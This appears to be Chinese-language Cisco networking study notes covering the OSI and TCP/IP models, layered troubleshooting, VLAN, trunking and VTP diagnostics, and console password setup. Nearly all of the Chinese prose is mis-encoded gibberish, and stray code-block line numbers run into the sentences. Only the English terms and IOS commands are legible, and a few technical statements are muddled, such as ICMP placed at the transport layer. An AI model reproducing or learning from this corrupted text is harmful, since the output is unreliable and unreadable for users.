æ¯”å¦‚ Telnetã€HTTPS ä»¥åŠ FTPï¼ˆå°½ç®¡ FTP ä½äºåº”ç”¨å±‚ï¼Œå®ƒç¡®å®ä½¿ç”¨äº† TCPï¼‰ã€‚UDP æ˜¯ä¸€ä¸ªæ— è¿æ¥åè®®ï¼ˆa connectionless protocolï¼‰ã€‚å®ƒåœ¨å¯¹æ•°æ®åŒ…è¿›è¡Œç¼–å·åå°±å‘å¾€ç›®çš„åœ°äº†ã€‚å®ƒç»ä¸ä¼šç®¡è¿™äº›æ•°æ®åŒ…æ˜¯å¦å®‰å…¨æŠµè¾¾ï¼Œä¹Ÿç»ä¸ä¼šåœ¨å‘é€æ•°æ®åŒ…å‰å»ºç«‹ä¸€æ¡è¿æ¥ã€‚åœ¨æ•°æ®ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œåº”ç”¨å¼€å‘è€…è§‰å¾—ä¿¡æ¯æ€»æ˜¯å¯ä»¥åœ¨æœªèƒ½åˆ°è¾¾ç›®çš„åœ°æ—¶é‡æ–°å‘é€æ—¶ï¼Œå¾€å¾€é‡‡ç”¨ UDPã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¦ç”¨åˆ° UDP å‘¢ï¼Ÿ TCP åè®®æœ¬èº«ä¼šæ¶ˆè€—è®¸å¤šç½‘ç»œçš„å¸¦å®½ï¼Œç”šè‡³åœ¨æ•°æ®è¿˜æ²¡å‘é€æ—¶ï¼Œä¸ºå»ºç«‹å…¶è¿æ¥ï¼Œä¹Ÿè¦å¾€å¤å‘é€å¾ˆå¤šæµé‡ã€‚è¿™éƒ½ä¼šè€—å»ä¸€äº›å®è´µçš„æ—¶é—´å’Œç½‘ç»œèµ„æºã€‚UDP æ•°æ®åŒ…æ¯”èµ· TCP åŒ…è¦å°å¾ˆå¤šï¼Œåœ¨æ— éœ€çœŸæ­£å¯é è¿æ¥æ—¶ï¼Œå®ƒæ˜¯æ˜¯å¦æœ‰ç”¨çš„ã€‚ä½¿ç”¨åˆ° UDP çš„åè®®æœ‰ TFTP ç­‰ã€‚ ç¬¬ä¸‰å±‚ â€“ ç½‘ç»œå±‚123ç½‘ç»œå±‚æ¥æ‰‹æ¥è‡ªä¼ è¾“å±‚çš„æ•°æ®æ®µï¼Œå°†å…¶æ‹†åˆ†ä¸ºå«åšæ•°æ®åŒ…çš„æ›´å°å•ä½ã€‚è®¸å¤šç½‘ç»œå·¥ç¨‹å¸ˆä¸ç®¡åœ¨ OSI çš„å“ªå±‚ï¼Œéƒ½æŠŠæ•°æ®å«åšåŒ…ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä½†æ˜¯ï¼Œè¯·è®°ä½ï¼ŒæŠ€æœ¯ä¸Šè¯´åªæœ‰åœ¨ç½‘ç»œå±‚ï¼Œæ‰å¯ä»¥å«åŒ…ã€‚ç½‘ç»œå±‚å¿…é¡»ç¡®å®šä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ç½‘ç»œçš„æœ€ä¼˜è·¯å¾„ï¼›ä¸ºæ­¤ï¼Œè·¯ç”±å™¨å·¥ä½œåœ¨è¯¥å±‚ã€‚è·¯ç”±å™¨åœ¨æ­¤é‡‡ç”¨é€»è¾‘å¯»å€ï¼Œè€Œ TCP/IP çš„å¯»å€æ–¹å¼æ˜¯ IP å¯»å€ï¼Œç¨åä¼šè®²åˆ°ã€‚ ç¬¬äºŒå±‚â€“æ•°æ®é“¾è·¯å±‚123æ•°æ®é“¾è·¯å±‚å°†æ•°æ®åŒ…æ‹†åˆ†æˆå¸§è¿™ç§æ›´å°çš„å•ä½ã€‚äºŒå±‚äº¤æ¢æœºå·¥ä½œåœ¨è¿™å±‚ï¼Œä½¿ç”¨ç¡¬ä»¶åœ°å€ï¼Œæˆ–æ˜¯ MAC åœ°å€ï¼Œå®ƒä»¬ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ›´å¿«åœ°äº¤æ¢æµé‡ï¼Œæ˜¯å› ä¸ºæ— éœ€æŸ¥çœ‹ IP åœ°å€å’Œè·¯ç”±è¡¨ã€‚å¹¿åŸŸç½‘åè®®å·¥ä½œåœ¨ç¬¬äºŒå±‚ï¼ŒåŒ…æ‹¬ HDLCã€ISDN ä»¥åŠ PPPã€‚ä»¥å¤ªç½‘ä¹Ÿæ˜¯ç¬¬äºŒå±‚çš„ã€‚ä¸ºäº†å‘å…¶ä¸Šä¸‹ä¸¤å±‚æä¾›æ¥å£-ï¼Œæ•°æ®é“¾è·¯å±‚åˆåˆ†äº†ä¸¤ä¸ªå­å±‚ï¼Œåˆ†åˆ«æ˜¯é€»è¾‘é“¾è·¯æ§åˆ¶å­å±‚ï¼ˆthe Logical Link Control, LLCï¼‰, ä»¥åŠä»‹è´¨è®¿é—®æ§åˆ¶å­å±‚ï¼ˆ the Media Access Control, MACï¼‰ã€‚é€»è¾‘é“¾è·¯æ§åˆ¶å­å±‚ä¸ç½‘ç»œå±‚äº¤äº’ï¼Œä»‹è´¨è®¿é—®æ§åˆ¶å­å±‚ä¸ç‰©ç†å±‚äº¤äº’ã€‚ ç¬¬ä¸€å±‚â€“ç‰©ç†å±‚1åœ¨è¿™å±‚ä¸Šï¼Œå¸§è¢«è½¬æ¢ä¸ºä½ï¼Œä»¥å°†å…¶æ”¾åˆ°çº¿è·¯ä¸Šã€‚è¿™äº›ä½æ˜¯ç”±ç”µè„‰å†²æ„æˆï¼Œè¯»ä½œâ€œå¼€â€â€œå…³â€ä½ï¼Œæˆ–æ˜¯äºŒè¿›åˆ¶çš„ 1 å’Œ 0ã€‚é›†çº¿å™¨å·¥ä½œäºæ­¤å±‚ï¼Œåœ¨è¿™é‡Œä½ ä¼šæ‰¾åˆ°çº¿ç¼†è§„æ ¼ï¼Œæ¯”å¦‚ RJ45ã€‚ OSIæ•…éšœæ’æŸ¥123456789101112åœ¨å¯¹ä½ çš„ç½‘ç»œè¿›è¡Œæ•…éšœæ’é™¤æ—¶ï¼Œé‡‡ç”¨å±‚æ¬¡åŒ–æ–¹æ³•æ˜¯ååˆ†æœ‰æ•ˆçš„ã€‚è‡³æ­¤ï¼Œä½ å”¯ä¸€è¦æ˜ç¡®çš„æ˜¯ä»å“ªä¸ªæ–¹å‘ä¸Šè¿ç”¨ OSI åè®®æ ˆï¼Œæ˜¯è‡ªé¡¶å‘ä¸‹å‘¢ï¼Œè¿˜æ˜¯è‡ªåº•å¾€ä¸Šï¼ŒæŠ‘æˆ–é‡‡ç”¨åˆ†è€Œæ²»ä¹‹ã€å„ä¸ªå‡»ç ´æ–¹æ³•ï¼Œè¿™åˆæ¶‰åŠåˆ°èšç„¦ç½‘ç»œçš„é‚£äº›éƒ¨åˆ†ã€‚æˆ‘å»ºè®®åœ¨åˆæœŸé‡‡ç”¨è‡ªåº•å‘ä¸Šçš„æ–¹æ³•ï¼Œå¯¹äºé€šå¸¸å¤„åœ¨è¾ƒä½çš„å±‚ä¸Šçš„é—®é¢˜ï¼Œæ¯”å¦‚å› ä¸ºçº¿ç¼†æ¾æ‰æˆ–ç ´æŸã€æˆ–è€…é…ç½®äº†ä¸æ­£ç¡®çš„ IP åœ°å€æ—¶ï¼Œä½ æ— éœ€æµªè´¹æ—¶é—´åœ¨æ£€æŸ¥åº”ç”¨ä¸Šã€‚åœ¨ä½ æœ‰æ›´å¤šç»éªŒåï¼Œåœ¨å¤„ç†æŸäº›æ•…éšœç°è±¡æ—¶é‡‡ç”¨å„ä¸ªå‡»ç ´æ–¹æ³•ä¼šæ›´ä¸ºå¿«é€Ÿã€‚åœ¨ä»åº•å±‚å¾€ä¸Šå¤„ç†é—®é¢˜æ—¶ï¼Œä½ å¤§æ¦‚ä¼šåšä¸‹é¢è¿™äº›äº‹æƒ…ï¼šç¬¬ä¸€å±‚ -- æ‰€æœ‰çº¿ç¼†éƒ½æ°å½“åœ°æ’å…¥åˆ°ç«¯å£äº†å—? è¿˜æ˜¯æœ‰çš„æ¾æ‰äº†ï¼Ÿ ç½‘çº¿å¤´å·²ç»å¼¯æ‰æˆ–æ˜¯ç£¨æŸäº†å—ï¼Ÿå¦‚æœç½‘çº¿æœ‰é—®é¢˜ï¼Œè®¾å¤‡ä¸Šçš„æŒ‡ç¤ºç¯ä¼šå‘ˆé»„è‰²ï¼Œè€Œéæ­£å¸¸çš„ç»¿è‰²ã€‚æ˜¯æœ‰äººæ²¡æœ‰å¾€æ¥å£ä¸Šé…ç½®æ­£ç¡®çš„é€Ÿç‡å—ï¼Ÿä»¥å¤ªç½‘ç«¯å£é€Ÿç‡æœ‰è¢«è®¾ç½®æ­£ç¡®å—ï¼Ÿæ¥å£æœ‰å¼€æ”¾ç»™ç½‘ç»œç®¡ç†å‘˜ä»¥ä½¿ç”¨å—ï¼Ÿç¬¬äºŒå±‚ -- æ¥å£æœ‰é‡‡ç”¨æ­£ç¡®çš„åè®®ï¼Œæ¯”å¦‚ Ethernet/PPP/HDLC, ä»¥ä¾¿èƒ½å¤Ÿä¸å¦ä¸€ç«¯ä¿æŒä¸€è‡´å—ï¼Ÿç¬¬ä¸‰å±‚ -- æ¥å£æœ‰ä½¿ç”¨æ­£ç¡®çš„ IP åœ°å€ä»¥åŠå­ç½‘æ©ç ï¼Ÿç¬¬å››å±‚ -- æœ‰ä½¿ç”¨æ­£ç¡®çš„è·¯ç”±åè®®å—ï¼Ÿä»è·¯ç”±å™¨é€šå‘Šçš„ç½‘ç»œæ˜¯æ­£ç¡®çš„å—ï¼Ÿ TCP&#x2F;IPã€DoD æ¨¡å‹TCP&#x2F;IP æ¨¡å‹æ˜¯å¦ä¸€ä¸ªæ¡†æ¶ï¼Œä½œä¸º OSI æ¨¡å‹çš„æ›¿ä»£ã€‚å®ƒæ˜¯ç”± é«˜çº§é˜²åŠ¡ç ”ç©¶é¡¹ç›®ç½²ï¼ˆthe Defense Advanced Research Projects Agencyï¼ŒDARPAï¼‰åˆ›å»ºçš„å››å±‚æˆ–äº”å±‚æ¨¡å‹ã€‚å®ƒå°±æ˜¯ä¸ºäººç†ŸçŸ¥çš„å›½é˜²éƒ¨æ¨¡å‹ã€‚è‡ªé¡¶å‘ä¸‹çš„å››å±‚åˆ†åˆ«æ˜¯ï¼š 12344 - åº”ç”¨, Application [Telnet/FTP/DNS/RIP]3 - ä¼ è¾“/ä¸»æœºåˆ°ä¸»æœºï¼ŒTransport/Host-to-Host [UDP/TCP/ICMP]2 - äº’è”ç½‘/ç½‘é™…ç½‘ç»œ, Internet or Internetwork [IPSec/IP]1 - é“¾è·¯/ç½‘ç»œæ¥å£ï¼ŒLink/Network Interface [Frame Relay/Ethernet/ATM] TCP&#x2F;IP æ¨¡å‹å·²ç”±å››å±‚æ›´æ–°ä¸ºäº”å±‚ï¼Œæ‰€ä»¥ä½ ä¼šåœ¨è€ƒè¯•ä¸­è¢«é—®åˆ°æœ‰å…³äº”å±‚ TCP æ¨¡å‹ï¼ˆa five-layered TCP modelï¼‰çš„é—®é¢˜ã€‚è¾ƒé«˜çš„å±‚ç¦»ç”¨æˆ·è¾ƒè¿‘ï¼Œè€Œè¾ƒä½çš„å±‚æè¿°äº†å…¶å®ƒç³»ç»Ÿäº¤äº’æ—¶æ‰€é‡‡ç”¨çš„æŠ€æœ¯æˆ–åè®®ã€‚äº”å±‚ TCP æ¨¡å‹å¦‚ä¸‹æ‰€ç¤ºï¼š 123455 - åº”ç”¨, Application [Telnet/FTP/DNS/RIP]4 - ä¼ è¾“/ä¸»æœºåˆ°ä¸»æœºï¼ŒTransport/Host-to-Host [UDP/TCP/ICMP]3 - ç½‘ç»œå±‚ï¼ŒNetwork [IPSec/IP]2 - æ•°æ®é“¾è·¯å±‚ï¼ŒData Link [Ethernet/Frame Relay/PPP]1 - é“¾è·¯/ç½‘ç»œæ¥å£/ç‰©ç†ï¼ŒLink/Network Interface/Physical [Bits on the wire] äº”å±‚çš„ TCP æ¨¡å‹å…·æœ‰æ›´ç»†çš„ç²’åº¦ï¼Œèƒ½æ›´ç²¾ç¡®åœ°è¡¨ç¤ºæ•°æ®æ”¾åœ¨çº¿è·¯ä¹‹å‰æ‰€å‘ç”Ÿçš„äº‹æƒ…ã€‚æ¯”å¦‚åœ¨ç¬¬äºŒå±‚å¤„ï¼Œè¿›è¡Œäº†æ•°æ®å°è£…ä»¥åŠå¯»å€ï¼ˆå¦‚æ•°æ®é“¾è·¯å¯»å€ï¼‰ã€‚è€ƒè¯•ä¸­æ€ç§‘åå‘é€‰æ‹©äº”å±‚æ¨¡å‹ã€‚ æ•°æ®ä¼šå¦‚åŒä¸Šè¿°çš„ OSI æ¨¡å‹é‚£æ ·åœ¨è‡ªåº”ç”¨å±‚å¾€ç‰©ç†å±‚çš„é€”ä¸­è¿›è¡Œå°è£…ï¼Œå¦‚è¡¨ æ‰€ç¤ºï¼š åº”ç”¨ï¼ŒApplication ä»æœªå°è£…çš„æ•°æ®ï¼Œ ä¼ è¾“ï¼ŒTransport å°† TCP å¤´éƒ¨æ·»åŠ åˆ°æ•°æ®ä¸Šï¼ŒTCP header added to the data æ®µï¼ŒSegment ç½‘ç»œï¼ŒNetwork IP å¤´éƒ¨è¢«æ·»åŠ ä¸Šå»ï¼ˆåŒ…æ‹¬ IP åœ°å€ï¼‰, IP header added(including IP address) åŒ…ï¼ŒPacket æ•°æ®é“¾è·¯ï¼ŒData Link æ·»åŠ æ•°æ®é“¾è·¯å¤´éƒ¨ï¼ˆæ•°æ®é“¾è·¯åœ°å€ï¼‰, Data Link header added(Data Link address) å¸§ï¼ŒFrame ç‰©ç†ï¼ŒPhysical è½¬å˜æˆç”µä¿¡å·, Turned into electrical signals çº¿è·¯ä¸Šçš„ä½ï¼ŒBits on the wire ä½ å¯èƒ½ä¼šè¢«é—®åŠ TCP&#x2F;IP æ¨¡å‹ä¸ OSI æ¨¡å‹çš„å¯¹åº”å…³ç³»ã€‚å¦‚è¡¨ æ‰€ç¤ºï¼š å±‚å·ï¼ŒLayer # OSI æ¨¡å‹ TCP æ¨¡å‹ 7 åº”ç”¨, Application åº”ç”¨, Application 6 è¡¨ç¤º, Presentation åº”ç”¨, Application 5 ä¼šè¯, Session åº”ç”¨, Application 4 ä¼ è¾“, Transport ä¸»æœºåˆ°ä¸»æœº, Host to Host 3 ç½‘ç»œ, Network ç½‘é™…ç½‘ç»œ, Internetwork 2 æ•°æ®é“¾è·¯, Data Link ç½‘ç»œæ¥å£, Network Interface 1 ç‰©ç†, Physical ç½‘ç»œæ¥å£, Network Interface 1.æ€»è¿°&#x3D;&#x3D;&#x3D;1 ä¸­ç»§é“¾è·¯ åŠ¨æ€ä¸­ç»§åè®® åŸç”Ÿvlan vlanä¹‹é—´è·¯ç”± vtpè™šæ‹Ÿå±€åŸŸç½‘ä¸­ç»§åè®® æ•…éšœæ’æŸ¥ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172VLAN æ•…éšœæ’é™¤åŸºç¡€ï¼Œ Basic VLAN TroubleshootingVLANs æ˜¯ä¸€ç§ç›¸å½“ç›´è§‚çš„äº¤æ¢æœºç‰¹æ€§ï¼Œå®ƒå¾ˆå°‘éœ€è¦è¿›è¡Œæ•…éšœæ’é™¤ã€‚ä½ æ‰€å‘ç°çš„é—®é¢˜ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯äººä¸ºé…ç½®é”™è¯¯ã€‚åœ¨ç¬¬ 15 å¤©çš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šè¯¦ç»†è®²åˆ°äºŒå±‚æ•…éšœæ’é™¤ã€‚è€Œä¸€äº›å¸¸è§çš„æ¶‰åŠ VLAN çš„é—®é¢˜æœ‰è¿™äº›ã€‚VLAN é—´è·¯ç”±æ— æ•ˆï¼ŒInter-VLAN routing not working: æ£€æŸ¥äº¤æ¢æœºä¹‹é—´çš„é“¾è·¯ã€è·¯ç”±å™¨éƒ½æ˜¯æ­£ç¡®è®¾ç½®çš„ï¼Œä»¥åŠç›¸å…³çš„ VLANs å…è®¸é€šè¿‡ä¸”æœªè¢«ä¿®å‰ªï¼ˆå‚ç…§ â€œVTP ä¿®å‰ªâ€ éƒ¨åˆ†ï¼‰ã€‚show interface trunk å‘½ä»¤å°†æä¾›æ‰€éœ€ä¿¡æ¯ã€‚è¿˜è¦æ£€æŸ¥è·¯ç”±å™¨å­æ¥å£æœ‰é…ç½®äº†æ­£ç¡®çš„å°æ–¹å¼å’Œ VLANï¼ŒåŒæ—¶å­æ¥å£çš„ IP åœ°å€æ˜¯é‚£äº›ä¸»æœºçš„é»˜è®¤ç½‘å…³ã€‚æ— æ³•åˆ›å»º VLANsï¼Œ VLANs cannot be created: æ£€æŸ¥äº¤æ¢æœºçš„ VTP æ¨¡å¼æ˜¯å¦è¢«è®¾ç½®æˆäº† â€œclientâ€ã€‚åœ¨ VTP æ¨¡å¼ä¸º â€œclientâ€ æ—¶ï¼Œæ˜¯ä¸èƒ½åˆ›å»º VLANs çš„ã€‚å¦ä¸€ä¸ªé‡è¦åŸå› æ˜¯äº¤æ¢æœºæ‰€å…è®¸çš„ VLANs ç¼–å·ã€‚show vtp status å‘½ä»¤å°†æä¾›æ‰€éœ€çš„ä¿¡æ¯ï¼ˆå‚çœ‹ä¸‹çš„â€œä¸­ç»§å’Œ VTP æ•…éšœæ’é™¤â€éƒ¨åˆ†ï¼‰ã€‚åŒä¸€ VLAN ä¸­çš„ä¸»æœºä¹‹é—´ä¸èƒ½é€šä¿¡ï¼ŒHosts within the same VLAN cannot reach each other: é‡è¦çš„æ˜¯æŸ VLAN ä¸­çš„ä¸»æœºéƒ½è¦æœ‰ä¸€ä¸ªå±äºåŒä¸€å­ç½‘çš„ IP åœ°å€ã€‚å¦‚å­ç½‘ä¸åŒï¼Œå®ƒä»¬ä¹‹é—´å°±æ— æ³•é€šä¿¡ã€‚å¦ä¸€ä¸ªéœ€è¦è€ƒè™‘çš„åŸå› æ˜¯è¿™äº›ä¸»æœºæ˜¯å¦éƒ½æ˜¯è¿æ¥åˆ°åŒä¸€å°äº¤æ¢æœºä¸Šã€‚å¦‚å®ƒä»¬ä¸æ˜¯è¿æ¥åˆ°åŒä¸€äº¤æ¢æœºï¼Œå°±è¦ç¡®ä¿äº¤æ¢æœºä¹‹é—´çš„ä¸­ç»§é“¾è·¯å·¥ä½œæ­£å¸¸ï¼Œè¿˜è¦ç¡®ä¿è¯¥ VLAN æœªåœ¨å…è®¸æ¸…å•ä¸­è¢«æ’é™¤/è¢«ä¿®å‰ª[ensure that the trunk links(s) between the switches is/are working correctly and that the VLAN is not excluded/not pruned from the allowed list]ã€‚show interface trunk å‘½ä»¤å°†ç»™å‡ºæœ‰å…³è¯¥ä¸­ç»§é“¾è·¯çš„æ‰€éœ€ä¿¡æ¯ã€‚ä¸­ç»§å’Œ VTP æ•…éšœæ’é™¤ï¼ŒTroubleshooting Trunking and VTPä¸‹é¢æ˜¯ä¸€äº›é—®é¢˜å®ä¾‹æœºå™¨å¯èƒ½çš„è§£å†³æ–¹æ³•ã€‚ä¸­ç»§å®•æ‰ï¼Ÿæ¥å£åŠ¡å¿…è¦æ˜¯ up/upä¸­ç»§é“¾è·¯ä¸¤ç«¯çš„å°è£…æ–¹å¼è¦åŒ¹é…SwitchA#show interface fa1/1 switchportName: Fa1/1Switchport: EnabledAdministrative Mode: trunkOperational Mode: trunkAdministrative Trunking Encapsulation: dot1qOperational Trunking Encapsulation: dot1qNegotiation of Trunking: DisabledAccess Mode VLAN: 0 ((Inactive))VLAN ä¿¡æ¯æœªæœ‰ä¼ è¾“è¯¥ VLAN åœ¨ä¸­ç»§é“¾è·¯ä¸Šé˜»å¡äº†å—Switch#show interface trunkVTP ä¿¡æ¯æ— æ³•åˆ°è¾¾ VTP å®¢æˆ·ç«¯VTP åŸŸåç§°å¯†ç æ­£ç¡®å—ï¼Ÿshow vtp status / show vtp passwordåœ¨å¢åŠ ä¸€å°æ–°çš„äº¤æ¢æœºåï¼Œæ‰€æœ‰ VTP ä¿¡æ¯éƒ½å˜åŠ¨äº†æ€»æ˜¯å®¢æˆ·ç«¯æ¨¡å¼åŠ å…¥æ–°çš„äº¤æ¢æœºï¼ˆä½†è¯·æŸ¥çœ‹ä¸Šé¢çš„æœ‰å…³â€œé…ç½®ä¿®è®¢å·ï¼ˆthe configuration revision numberï¼‰â€çš„æç¤ºï¼‰æœåŠ¡å™¨æ¨¡å¼å°†é€šå‘Šæ–°ä¿¡æ¯VTP ä¿®å‰ªæ— æ•ˆä¸­é—´æ˜¯å¦æœ‰ä¸€å°é€æ˜äº¤æ¢æœºï¼Ÿè¯¥ VLAN å…è®¸é€šè¿‡è¯¥ä¸­ç»§é“¾è·¯ï¼ŸVLAN é—´è·¯ç”±æ•…éšœæ’é™¤ï¼Œ Troubleshooting Inter-VLAN RoutingVLAN é—´è·¯ç”±æ•…éšœå¯ä»¥å¤šç§å½¢å¼å‡ºç°ï¼Œå°¤å…¶æ˜¯è€ƒè™‘åœ¨è¯¥è¿‡ç¨‹ä¸­æ¶‰åŠå¤šç§è®¾å¤‡ï¼ˆäº¤æ¢æœºã€è·¯ç”±å™¨ç­‰ï¼‰ã€‚é€šè¿‡ä¸‹é¢ç»™å‡ºçš„é€‚å½“æ•…éšœæ’é™¤æ–¹æ³•è®ºï¼Œä½ å°±èƒ½å¤Ÿå°†é—®é¢˜å­¤ç«‹åœ¨æŸå°ç‰¹å®šè®¾å¤‡ä¸Šï¼Œæ¥ç€å†å…¶å¯¹åº”åˆ°ä¸€ä¸ªé”™è¯¯é…ç½®çš„å…·ä½“ç‰¹æ€§ã€‚ä»è¿é€šæ€§ç«‹è¶³ç‚¹ä¸Šçœ‹ï¼Œä¸‹é¢è¿™äº›æƒ…äº‹éƒ½åº”è¯¥æ£€æŸ¥ä¸€ä¸‹ã€‚æ£€æŸ¥ä¸€ä¸‹ç»ˆç«¯ä¸»æœºè¿æ¥äº†æ­£ç¡®çš„äº¤æ¢æœºç«¯å£æ£€æŸ¥ä¸€ä¸‹æ­£ç¡®çš„äº¤æ¢æœºç«¯å£è¿æ¥äº†æ­£ç¡®çš„è·¯ç”±å™¨ç«¯å£ï¼ˆå¦‚ä½¿ç”¨äº†ä¸€å°è·¯ç”±å™¨åš VLAN é—´è·¯ç”±ï¼‰æ£€æŸ¥ä¸€ä¸‹åœ¨æ­¤è¿‡ç¨‹ä¸­æ‰€æ¶‰åŠåˆ°çš„æ¯ä¸ªç«¯å£æ‰¿è½½çš„æ˜¯æ­£ç¡®çš„ VLANsè¿æ¥ç»ˆç«¯ç«™çš„é‚£äº›ç«¯å£ï¼Œé€šå¸¸æ˜¯è¢«åˆ†é…åˆ°ä¸€ä¸ªç‰¹å®š VLAN çš„æ¥å…¥ç«¯å£è€Œå°†äº¤æ¢æœºè¿æ¥è‡³è·¯ç”±å™¨çš„é‚£äº›ç«¯å£ï¼Œåˆ™é€šå¸¸æ˜¯ä¸­ç»§ç«¯å£åœ¨ç¡®è®¤è®¾å¤‡ä¹‹é—´çš„è¿é€šæ€§æ— è¯¯åï¼Œé€»è¾‘ä¸Šä¸‹ä¸€æ­¥å°±æ˜¯æ£€æŸ¥äºŒå±‚é…ç½®äº†ï¼Œä»¥æ‰€é…ç½®çš„ä¸­ç»§ç«¯å£ä¸Šçš„å°è£…æ–¹å¼å¼€å§‹, è¿™é€šå¸¸æ˜¯ä½œä¸ºé¦–é€‰çš„ 802.1Q å°è£…æ–¹å¼ã€‚æ¥ç€å°±è¦ç¡®ä¿ä¸­ç»§é“¾è·¯ä¸¤ç«¯éƒ½æ˜¯é…ç½®äº†åŒæ ·çš„å°è£…æ–¹å¼ã€‚å¯ç”¨äºæŸ¥çœ‹å°ç±»å‹çš„ä¸€äº›å‘½ä»¤æœ‰ä»¥ä¸‹è¿™äº›ã€‚show interface trunkshow interface &lt;number&gt; switchportè¿™é‡Œæœ‰ä¸ªè¾“å‡ºç¤ºä¾‹ã€‚Cat-3550-1#show interfaces trunkPort Mode Encapsulation Status Native vlanFa0/1 on 802.1q trunking 1Fa0/2 on 802.1q trunking 1Port Vlans allowed on trunkFa0/1 1,10,20,30,40,50Fa0/2 1-99,201-4094å‘½ä»¤ show interface trunk æä¾›çš„å¦ä¸€é‡è¦ç»†èŠ‚æ˜¯ä¸­ç»§çŠ¶æ€ã€‚ä»ä¸­ç»§çŠ¶æ€å¯ä»¥çœ‹å‡ºä¸­ç»§æ˜¯å¦å½¢æˆï¼ŒåŒæ—¶åœ¨é“¾è·¯ä¸¤ç«¯éƒ½è¦æ£€æŸ¥ä¸­ç»§çŠ¶æ€ã€‚å¦‚æœæ¥å£æœªå¤„äºâ€œä¸­ç»§â€æ¨¡å¼ï¼Œé‚£ä¹ˆæ¥å£çš„è¿è¡Œæ¨¡å¼ï¼ˆon, auto, ç­‰ï¼‰æ˜¯æœ€é‡è¦çš„æ£€æŸ¥é¡¹ï¼Œä»¥å¼„æ¸…æ¥å£èƒ½å¦å…è®¸ä¸é“¾è·¯å¦ä¸€ç«¯å½¢æˆä¸­ç»§æ€ï¼ˆa trunking stateï¼‰ã€‚ä¸­ç»§ç«¯å£ä¸Šå¦å¤–ä¸€ä¸ªéœ€è¦æ£€æŸ¥çš„é‡è¦å…ƒç´ ä¾¿æ˜¯åŸç”Ÿ VLANã€‚åŸç”Ÿ VLAN é”™è¯¯é…ç½®å¯èƒ½å¸¦æ¥åŠŸèƒ½ç¼ºå¤±ï¼ŒæŠ‘æˆ–å®‰å…¨é—®é¢˜ã€‚ä¸­ç»§é“¾è·¯çš„ä¸¤ç«¯çš„åŸç”Ÿ VLAN éœ€è¦åŒ¹é…ã€‚å‡å¦‚åœ¨å®ŒæˆäºŒå±‚æ£€æŸ¥ä»»åŠ¡åï¼ŒVLAN é—´è·¯ç”±é—®é¢˜ä»ç„¶å­˜åœ¨ï¼Œä½ å°±å¯ä»¥ç»§ç»­è¿›è¡Œä¸‰å±‚é…ç½®æ£€æŸ¥äº†ã€‚ä¾æ®ç”¨äºå®ç° VLAN é—´è·¯ç”±çš„ä¸‰å±‚è®¾å¤‡ï¼Œå¯èƒ½ä¼šåœ¨ä¸‹åˆ—è®¾å¤‡ä¸Šè¿›è¡Œé…ç½®åŠé…ç½®æ£€æŸ¥ã€‚å¤šå±‚äº¤æ¢æœºï¼Œmultilayer switchè·¯ç”±å™¨ -- ç‰©ç†æ¥å£ï¼Œ router -- physical interfacesè·¯ç”±å™¨ -- å­æ¥å£ï¼Œrouter -- subinterfacesä¸‰å±‚è®¾å¤‡ä¸Šåº”è¯¥æ£€æŸ¥ä¸€ä¸‹å…¶å„æ¥å£ï¼ˆæˆ–è€…äº¤æ¢æœºè™šæ‹Ÿæ¥å£ï¼ŒSVIï¼‰éƒ½æœ‰åˆ†é…çš„æ­£ç¡®çš„å­ç½‘ï¼ŒåŒæ—¶å¦‚æœ‰å¿…è¦ï¼Œä½ è¿˜åº”æ£€æŸ¥ä¸€ä¸‹è·¯ç”±åè®®ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå„ä¸ª VLAN éƒ½æœ‰åˆ†é…ä¸åŒçš„å­ç½‘ï¼Œæ‰€ä»¥ä½ åº”ç¡®ä¿ä½ æœªæ›¾é”™è¯¯é…ç½®äº†æ¥å£ã€‚è€Œä¸ºæ£€æŸ¥æ­¤é¡¹ï¼Œä½ å¯ä»¥å¯¹ç‰¹å®šç‰©ç†æ¥å£ã€å­æ¥å£æˆ–æ˜¯ SVIï¼Œä½¿ç”¨ show interface å‘½ä»¤ã€‚ 2.æ€»è¿°&#x3D;&#x3D;&#x3D;2å®‰å…¨ç›¸å…³ ç‰©ç†è®¿é—®é˜²æŠ¤ è®¿é—®å°è®¿é—® 12345678910111213141516171819202122æ§åˆ¶å°è®¿é—®æ§åˆ¶å°æ¥å£æ˜¯è®¾è®¡ç”¨äºæä¾›åˆ°è·¯ç”±å™¨çš„ç‰©ç†è®¿é—®çš„ï¼Œä»¥å®Œæˆè·¯ç”±å™¨çš„åˆå§‹è®¾ç½®åŠç¾éš¾æ¢å¤ã€‚ä»»ä½•èƒ½å–å¾—æ§åˆ¶å°è®¿é—®çš„äººï¼Œéƒ½èƒ½å¤Ÿå®Œå…¨æ“¦å‡ºæˆ–æ˜¯é‡æ–°é…ç½®è¿™äº›æ–‡ä»¶ï¼Œå› æ­¤ï¼Œæ§åˆ¶å°æ¥å£åº”æœ‰ä¸€ä¸ªå£ä»¤è¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥ç®€å•åœ°æ·»åŠ ä¸€ä¸ªå£ä»¤ï¼Œä¹Ÿå¯ä»¥ä¸ºå…¶æ·»åŠ ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·åå’Œå£ä»¤ï¼Œå¦‚ä¸‹é¢æ‰€ç¤ºã€‚åªæ·»åŠ ä¸€ä¸ªå£ä»¤å³å¯Router(config)#line console 0Router(config-line)#password ciscoRouter(config-line)#loginä¸ºæ§åˆ¶å°æ·»åŠ ä¸€ä¸ªæœ¬åœ°ç”¨æˆ·åå’Œå£ä»¤ç»„åˆRouter(config)#username paul password ciscoRouter(config)#line console 0Router(config-line)#login localä½ è¿˜å¯ä»¥ä¸ºæ§åˆ¶å°ï¼ˆä»¥åŠè™šæ‹Ÿç»ˆç«¯ï¼‰çº¿è·¯åˆ›å»ºä¸€ä¸ªè¶…æ—¶å€¼ï¼Œå¦‚æ­¤å°±å¯ä»¥åœ¨ç¡®å®šçš„æ—¶é—´è¿‡åæ–­å¼€è¿æ¥ã€‚é»˜è®¤çš„è¶…æ—¶æ˜¯5åˆ†é’Ÿã€‚Router(config)#line console 0Router(config-line)#exec-timeout ? &lt;0-35791&gt; Timeout 